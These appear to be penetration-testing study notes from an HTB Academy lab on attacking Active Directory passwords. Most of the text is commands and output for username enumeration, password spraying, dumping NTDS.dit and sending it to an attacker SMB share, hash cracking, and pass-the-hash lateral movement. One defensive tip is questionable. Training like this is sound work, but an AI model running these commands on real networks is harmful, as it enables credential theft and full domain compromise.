# Active Directory Password Attacks

## 🎯 Overview

Active Directory (AD) is the most critical directory service in modern enterprise networks. When an organization uses Windows, AD manages those Windows systems. Attacking AD is extensive and significant - **if you can compromise AD, you can compromise the entire domain**.

> **"If this file can be captured, we could potentially compromise every account on the domain"** - NTDS.dit
> 
> **"This account has both Administrators and Domain Administrator rights which means we can do just about anything we want"**

## 🏗️ Active Directory Authentication Process

### Domain-Joined Systems
Once a Windows system joins a domain:
- **No longer uses SAM database** for authentication by default
- **Sends authentication requests to Domain Controller** for validation
- **Local accounts still accessible** by specifying `hostname\username` or `.\username`

### Authentication Flow
```
User Login → LSASS.exe → Authentication Packages → NTLM/Kerberos → AD Directory Services
```

## 🔍 Username Enumeration and Discovery

### Common Username Conventions

| Convention | Example (Jane Jill Doe) | Real World Usage |
|------------|-------------------------|------------------|
| `firstinitiallastname` | `jdoe` | Very common |
| `firstinitialmiddleinitiallastname` | `jjdoe` | Government orgs |
| `firstnamelastname` | `janedoe` | Small companies |
| `firstname.lastname` | `jane.doe` | Corporate standard |
| `lastname.firstname` | `doe.jane` | Some enterprises |
| `nickname` | `doehacksstuff` | Rare, custom |

### OSINT for Username Discovery

#### Google Dorking for Usernames
```bash
# Search for email addresses to infer username structure
"@inlanefreight.com" site:linkedin.com
"inlanefreight.com filetype:pdf"

# Look for employee directories
site:inlanefreight.com "directory" OR "staff" OR "employees"

# PDF metadata often contains usernames
"inlanefreight.com filetype:pdf" "author:"
```

#### Social Media Reconnaissance
```bash
# LinkedIn employee discovery
site:linkedin.com "IT Director" "inlanefreight"
site:linkedin.com "Financial Controller" "inlanefreight"

# Company website employee pages
site:inlanefreight.com "our team" OR "leadership" OR "staff"
```

### Creating Custom Username Lists

#### Manual List Creation
```bash
# Example employee names from OSINT:
# John Marston (IT Director)
# Carol Johnson (Financial Controller) 
# Jennifer Stapleton (Logistics Manager)

cat > usernames.txt << EOF
# John Marston variations
jmarston
john.marston
marston.john
j.marston
johnmarston
marstonj
jm

# Carol Johnson variations
cjohnson
carol.johnson
johnson.carol
c.johnson
caroljohnson
johnsonc
cj

# Jennifer Stapleton variations
jstapleton
jennifer.stapleton
stapleton.jennifer
j.stapleton
jenniferstapleton
stapletonj
js
EOF
```

#### Automated Username Generation with Username Anarchy
```bash
# Install Username Anarchy
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

# Create names file
cat > names.txt << EOF
John Marston
Carol Johnson
Jennifer Stapleton
EOF

# Generate username variations
./username-anarchy -i names.txt > generated_usernames.txt

# Example output:
# john, johnmarston, john.marston, jmarston, marstonj, etc.
```

### Username Enumeration with Kerbrute

#### Basic Username Enumeration (Safest Method)
```bash
# Enumerate valid usernames (no account lockouts)
./kerbrute userenum --dc 10.129.201.57 --domain inlanefreight.local usernames.txt

# Expected output:
# [+] VALID USERNAME: jmarston@inlanefreight.local
# [+] VALID USERNAME: cjohnson@inlanefreight.local
# [+] VALID USERNAME: jstapleton@inlanefreight.local
```

#### Advanced Kerbrute Options
```bash
# Verbose output with more details
./kerbrute userenum --dc 10.129.201.57 --domain inlanefreight.local usernames.txt -v

# Save valid usernames to file
./kerbrute userenum --dc 10.129.201.57 --domain inlanefreight.local usernames.txt -o valid_users.txt

# Capture AS-REP hashes for offline cracking
./kerbrute userenum --dc 10.129.201.57 --domain inlanefreight.local usernames.txt --hash-file asrep_hashes.txt
```

## 🗡️ Password Attacks Against Active Directory

### NetExec Dictionary Attacks

#### Single User Password Brute Force
```bash
# Brute force specific user with password list (ALWAYS include domain!)
netexec smb 10.129.201.57 -u jmarston -p /usr/share/wordlists/fasttrack.txt -d inlanefreight.local

# Expected output:
# SMB    10.129.201.57    445    DC01    [-] inlanefreight.local\jmarston:winter2017 STATUS_LOGON_FAILURE
# SMB    10.129.201.57    445    DC01    [-] inlanefreight.local\jmarston:winter2016 STATUS_LOGON_FAILURE
# SMB    10.129.201.57    445    DC01    [+] inlanefreight.local\jmarston:Password123!
```

#### HTB Academy Practical Example
```bash
# Example from HTB Academy lab - ILF.local domain
netexec smb 10.129.202.85 -u usernames.txt -p /usr/share/wordlists/fasttrack.txt --continue-on-success -d ILF.local

# With additional flags for comprehensive attack
netexec smb 10.129.202.85 -u usernames.txt -p /usr/share/wordlists/fasttrack.txt --continue-on-success -d ILF.local --verbose

# If admin credentials found - extract NTDS.dit immediately
netexec smb 10.129.202.85 -u FOUND_USER -p FOUND_PASS -d ILF.local --ntds
```

#### Password Spraying (Multiple Users, Single Password)
```bash
# Test single password against multiple users (ALWAYS include domain!)
netexec smb 10.129.201.57 -u valid_users.txt -p 'Password123!' --continue-on-success -d inlanefreight.local

# Common corporate passwords to test
cat > common_passwords.txt << EOF
Password123!
Welcome2024!
CompanyName123!
Summer2024!
Spring2024!
P@ssw0rd!
Password1
EOF

# Spray multiple passwords
netexec smb 10.129.201.57 -u valid_users.txt -p common_passwords.txt --continue-on-success -d inlanefreight.local
```

#### Essential NetExec Flags for AD Attacks
```bash
# Core flags you should ALWAYS use in AD environments:
-d DOMAIN.local          # Domain name (CRITICAL for AD!)
--continue-on-success    # Don't stop after first success
--verbose                # More detailed output
--ntds                   # Extract NTDS.dit (requires admin)
--sam                    # Extract SAM database
--lsa                    # Extract LSA secrets
--shares                 # Enumerate shares
--sessions               # Show active sessions
--pass-pol               # Check password policy
--rid-brute              # RID brute force enumeration

# Example with all useful flags:
netexec smb 10.129.202.85 -u valid_users.txt -p common_passwords.txt \
  --continue-on-success -d ILF.local --verbose --shares --pass-pol
```

#### Complete Username/Password Combination Testing
```bash
# Test all combinations
netexec smb 10.129.201.57 -u usernames.txt -p passwords.txt

# From username:password file
netexec smb 10.129.201.57 -u combo_file.txt --no-bruteforce

# Format of combo_file.txt:
# admin:password
# jmarston:Password123
# cjohnson:Finance2024!
```

### HTB Academy Example Attack Chain

#### Step 1: OSINT-Based Username Creation
```bash
# Discovered employees:
# - John Marston (IT Director)
# - Carol Johnson (Financial Controller)  
# - Jennifer Stapleton (Logistics Manager)

# Create targeted username list
cat > inlanefreight_users.txt << EOF
jmarston
john.marston
marston.john
cjohnson
carol.johnson
johnson.carol
jstapleton
jennifer.stapleton
stapleton.jennifer
EOF
```

#### Step 2: Username Validation
```bash
# Validate usernames with Kerbrute
./kerbrute userenum --dc 10.129.201.57 --domain inlanefreight.local inlanefreight_users.txt -v

# Results should show valid accounts
```

#### Step 3: Password Attack
```bash
# Password spray with common patterns
netexec smb 10.129.201.57 -u valid_users.txt -p 'Password123!' --continue-on-success
netexec smb 10.129.201.57 -u valid_users.txt -p 'Welcome2024!' --continue-on-success
```

### Password Attack Considerations

#### Account Lockout Risks
- **Default Windows domains** often have NO account lockout policy
- **Corporate environments** may have 3-5 failed attempt lockouts
- **Always check lockout policy first** if possible
- **Use `--safe` flag in Kerbrute** to detect lockouts

#### Event Log Generation
```bash
# Events generated by password attacks:
# Event ID 4625: An account failed to log on (traditional attacks)
# Event ID 4768: Kerberos TGT request (Kerbrute enumeration)
# Event ID 4771: Kerberos pre-authentication failed (Kerbrute password attacks)
```

## 🎫 NTDS.dit Extraction and Analysis

### What is NTDS.dit?
**NT Directory Services Directory Information Tree** contains:
- **All domain usernames** and attributes
- **Password hashes** (NTLM) for every domain account
- **Group memberships** and permissions
- **Security descriptors** and access controls
- **Kerberos keys** and other authentication data

**Location**: `%systemroot%\ntds\NTDS.dit` (usually `C:\Windows\NTDS\NTDS.dit`)

### Prerequisites for NTDS.dit Access
- **Local Administrator** rights on Domain Controller, OR
- **Domain Administrator** rights, OR
- **Backup Operators** group membership, OR
- **Other equivalent privileges**

### Method 1: Direct Access (If You Have DC Access)

#### Step 1: Connect to Domain Controller
```bash
# Use discovered credentials to connect
evil-winrm -i 10.129.201.57 -u jmarston -p 'Password123!'

# Or with hash (Pass-the-Hash)
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

#### Step 2: Check Privileges
```powershell
# Check local group membership
net localgroup

# Check user privileges including domain
net user jmarston

# Look for these key memberships:
# - Local Group Memberships: *Administrators
# - Global Group memberships: *Domain Admins
```

#### Step 3: Create Volume Shadow Copy
```powershell
# Create VSS snapshot of C: drive
vssadmin CREATE SHADOW /For=C:

# Example output:
# Successfully created shadow copy for 'C:\'
#     Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
#     Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

#### Step 4: Copy NTDS.dit and SYSTEM
```powershell
# Create destination directory
mkdir C:\temp

# Copy NTDS.dit from shadow copy
cmd.exe /c copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit" C:\temp\NTDS.dit

# Copy SYSTEM registry hive (needed for decryption)
cmd.exe /c copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM" C:\temp\SYSTEM

# Copy SECURITY hive (for additional secrets)
cmd.exe /c copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SECURITY" C:\temp\SECURITY
```

#### Step 5: Transfer Files to Attack Host
```bash
# On attack host - setup SMB server
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp/

# On target DC - transfer files
cmd.exe /c move C:\temp\NTDS.dit \\10.10.15.30\CompData
cmd.exe /c move C:\temp\SYSTEM \\10.10.15.30\CompData
cmd.exe /c move C:\temp\SECURITY \\10.10.15.30\CompData
```

### Method 2: NetExec ntdsutil Module (One Command!)

#### Remote NTDS.dit Extraction
```bash
# Extract NTDS.dit remotely using NetExec
netexec smb 10.129.201.57 -u jmarston -p Password123! -M ntdsutil

# Expected output:
# NTDSUTIL   10.129.201.57   445   DC01   [*] Dumping ntds with ntdsutil.exe
# NTDSUTIL   10.129.201.57   445   DC01   [+] NTDS.dit dumped to C:\Windows\Temp\174556000
# NTDSUTIL   10.129.201.57   445   DC01   [*] Copying NTDS dump to /tmp/tmpcw5zqy5r
# NTDSUTIL   10.129.201.57   445   DC01   Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
# NTDSUTIL   10.129.201.57   445   DC01   Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# NTDSUTIL   10.129.201.57   445   DC01   krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
```

#### Alternative NetExec Methods
```bash
# Just dump hashes without file transfer
netexec smb 10.129.201.57 -u jmarston -p Password123! --ntds

# Dump LSA secrets too
netexec smb 10.129.201.57 -u jmarston -p Password123! --ntds --lsa

# Save to specific output file
netexec smb 10.129.201.57 -u jmarston -p Password123! --ntds --outputfile ntds_dump
```

### Method 3: Impacket secretsdump

#### Local Hash Extraction
```bash
# Extract hashes from downloaded files
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

# Include LSA secrets
impacket-secretsdump -ntds NTDS.dit -system SYSTEM -security SECURITY LOCAL

# Example output format:
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
# jmarston:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
```

#### Remote Hash Extraction
```bash
# Direct remote extraction
python3 secretsdump.py inlanefreight.local/jmarston:Password123!@10.129.201.57

# Just domain credentials
python3 secretsdump.py inlanefreight.local/jmarston:Password123!@10.129.201.57 -just-dc-ntlm

# With hash instead of password
python3 secretsdump.py -hashes :64f12cddaa88057e06a81b54e73b949b inlanefreight.local/Administrator@10.129.201.57
```

## 🔓 Hash Cracking and Analysis

### Extracting Specific Hashes for Cracking

#### HTB Academy Example - Jennifer Stapleton
```bash
# From NTDS.dit output, find Jennifer Stapleton's hash
grep -i "stapleton" ntds_dump.txt
# jstapleton:1134:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::

# Extract just the NT hash (after the last colon)
echo "161cff084477fe596a5db81874498a24" > stapleton_hash.txt
```

#### Hash Cracking with Hashcat
```bash
# Crack NT hash with rockyou.txt
hashcat -m 1000 stapleton_hash.txt /usr/share/wordlists/rockyou.txt

# With rules for better success rate
hashcat -m 1000 stapleton_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked passwords
hashcat -m 1000 stapleton_hash.txt --show

# Example result:
# 161cff084477fe596a5db81874498a24:Password123
```

#### Bulk Hash Cracking
```bash
# Extract all NT hashes to file
grep ":::" ntds_dump.txt | cut -d: -f4 > all_nt_hashes.txt

# Crack all hashes
hashcat -m 1000 all_nt_hashes.txt /usr/share/wordlists/rockyou.txt

# Create hash:username mapping for context
grep ":::" ntds_dump.txt | awk -F: '{print $4":"$1}' > hash_to_user.txt
```

### Password Pattern Analysis
```bash
# Common corporate password patterns to look for:
# - CompanyName + Year (Inlanefreight2024!)
# - Season + Year (Summer2024!, Spring2024!)
# - Password + Number (Password1, Password123!)
# - Welcome + Year (Welcome2024!)
# - Department + Year (Finance2024!, IT2024!)
```

## ⚔️ Pass-the-Hash (PtH) Attacks

### Understanding Pass-the-Hash
When hash cracking fails, **Pass-the-Hash** attacks allow authentication using **NTLM hashes directly**:
- **No plaintext password needed**
- **Uses NTLM authentication protocol**
- **Format**: `username:hash` instead of `username:password`

### Evil-WinRM Pass-the-Hash
```bash
# Connect using NT hash instead of password
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

# Connect to different target with same hash
evil-winrm -i 10.129.201.58 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

### Impacket Pass-the-Hash Tools
```bash
# psexec with hash
python3 psexec.py -hashes :64f12cddaa88057e06a81b54e73b949b Administrator@10.129.201.57

# wmiexec with hash
python3 wmiexec.py -hashes :64f12cddaa88057e06a81b54e73b949b Administrator@10.129.201.57

# smbexec with hash
python3 smbexec.py -hashes :64f12cddaa88057e06a81b54e73b949b Administrator@10.129.201.57

# secretsdump with hash for lateral movement
python3 secretsdump.py -hashes :64f12cddaa88057e06a81b54e73b949b Administrator@10.129.201.58
```

### NetExec Pass-the-Hash
```bash
# Test hash against multiple targets
netexec smb 10.129.201.0/24 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

# Execute commands with hash
netexec smb 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b -x "whoami"

# Dump additional hashes
netexec smb 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b --sam
```

## 🏆 Complete Attack Workflow - HTB Academy Example

### Scenario: Inlanefreight Company Assessment

#### Phase 1: Information Gathering
```bash
# 1. OSINT - Discovered employees through social media/company website:
# - John Marston (IT Director)
# - Carol Johnson (Financial Controller)  
# - Jennifer Stapleton (Logistics Manager)

# 2. Create targeted username list
cat > inlanefreight_targets.txt << EOF
jmarston
john.marston
marston.john
cjohnson
carol.johnson
johnson.carol
jstapleton
jennifer.stapleton
stapleton.jennifer
EOF
```

#### Phase 2: Username Enumeration
```bash
# 3. Validate usernames with Kerbrute
./kerbrute userenum --dc 10.129.201.57 --domain inlanefreight.local inlanefreight_targets.txt -o valid_users.txt

# Expected results:
# [+] VALID USERNAME: jmarston@inlanefreight.local
# [+] VALID USERNAME: cjohnson@inlanefreight.local  
# [+] VALID USERNAME: jstapleton@inlanefreight.local
```

#### Phase 3: Password Attacks
```bash
# 4. Password spraying with common corporate passwords (with domain!)
netexec smb 10.129.201.57 -u valid_users.txt -p 'Password123!' --continue-on-success -d inlanefreight.local

# Expected result:
# [+] inlanefreight.local\jmarston:Password123! (Success)
```

#### Phase 4: Domain Controller Access
```bash
# 5. Connect to DC with discovered credentials
evil-winrm -i 10.129.201.57 -u jmarston -p 'Password123!'

# 6. Check privileges
net user jmarston
# Result: Global Group memberships *Domain Users *Domain Admins
```

#### Phase 5: NTDS.dit Extraction
```bash
# 7. Extract all domain hashes with NetExec
netexec smb 10.129.201.57 -u jmarston -p 'Password123!' -M ntdsutil

# All domain hashes extracted, including Jennifer Stapleton's
```

#### Phase 6: Hash Cracking
```bash
# 8. Extract Jennifer Stapleton's hash from output
# jstapleton:1134:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::

# 9. Crack the hash
echo "161cff084477fe596a5db81874498a24" > jstapleton_hash.txt
hashcat -m 1000 jstapleton_hash.txt /usr/share/wordlists/rockyou.txt

# Result: 161cff084477fe596a5db81874498a24:Password123
```

#### Phase 7: Lateral Movement
```bash
# 10. Use extracted Administrator hash for lateral movement
evil-winrm -i 10.129.201.58 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

# 11. Compromise additional systems
netexec smb 10.129.201.0/24 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

## 🛡️ Defense and Detection

### Preventing Username Enumeration
- **Disable Kerberos pre-authentication logging** (limited effectiveness)
- **Monitor Event ID 4768** for unusual patterns
- **Network monitoring** for Kerberos traffic spikes
- **Rate limiting** on authentication services

### Preventing Password Attacks
- **Strong account lockout policies** (affects usability)
- **Long and complex passwords** required by policy
- **Monitor Event ID 4625** for failed logons
- **Multi-factor authentication** for privileged accounts

### Protecting NTDS.dit
- **Restrict administrative access** to Domain Controllers
- **Monitor VSS creation** and NTDS file access
- **File integrity monitoring** on critical AD files
- **Backup encryption** and secure storage

### Detecting Pass-the-Hash
- **Monitor for logons** with unusual patterns
- **Detect lateral movement** between systems
- **Hash rotation** for service accounts
- **Privileged Access Workstations** (PAWs)

## 📋 Quick Reference Commands

### Username Enumeration
```bash
./kerbrute userenum --dc DC_IP --domain DOMAIN usernames.txt -v -o valid_users.txt
```

### Password Spraying
```bash
netexec smb DC_IP -u valid_users.txt -p 'Password123!' --continue-on-success -d DOMAIN.local
```

### NTDS.dit Extraction
```bash
netexec smb DC_IP -u USER -p PASS -d DOMAIN.local -M ntdsutil
# OR direct extraction:
netexec smb DC_IP -u USER -p PASS -d DOMAIN.local --ntds
```

### Hash Cracking
```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash
```bash
evil-winrm -i TARGET_IP -u Administrator -H NTHASH
```

---

## 🎯 Key Takeaways

1. **OSINT is critical** - Real employee names lead to valid usernames
2. **Username enumeration first** - Validate targets before password attacks
3. **Password spraying > brute force** - Less likely to trigger lockouts
4. **NTDS.dit = domain ownership** - Every account's hash in one file
5. **Pass-the-Hash when cracking fails** - Hashes are often as good as passwords
6. **Domain Admin = total compromise** - Can access any system in the domain

**Remember**: The goal is demonstrating complete domain compromise and business impact! 🏆 